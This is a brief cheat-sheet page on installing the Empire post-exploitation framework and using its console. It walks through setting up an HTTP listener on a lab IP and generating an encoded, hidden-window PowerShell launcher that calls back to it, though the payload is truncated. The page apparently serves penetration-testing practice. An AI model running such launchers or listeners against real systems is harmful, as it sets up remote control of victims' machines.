---
title: "Empire"
description: "Empire is a PowerShell and Python post-exploitation agent."
date: 2020-03-06T13:01:48+01:00
draft: false
tags: ['Frameworks','post-exploitation']
---

### Install

#### System

```bash
git clone https://github.com/EmpireProject/Empire
cd Empire
sudo ./setup/install.sh
```

#### Docker

```bash
docker pull empireproject/empire
```

### Examples

#### Reset DB

```bash
/empire/setup/reset.sh
```

#### setup basic listener and gen launcher

```bash
(Empire) > listeners
[!] No listeners currently active
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://10.10.14.24:80
(Empire: listeners/http) > set BindIP 10.10.14.24
(Empire: listeners/http) > set Port 80
(Empire: listeners/http) > execute
[*] Starting listener 'http'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
(Empire: listeners/http) > back
(Empire: listeners) > launcher
[!] Please enter 'launcher <language> <listenerName>'
(Empire: listeners) > launcher powershell http
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAF.....kAEsAKQApAHwASQBFAFgA
```

### Also see

* [Github project](https://github.com/EmpireProject/Empire)
* [Quickstart](http://www.powershellempire.com/?page_id=110)
* [Documentation](http://www.powershellempire.com/?page_id=83)
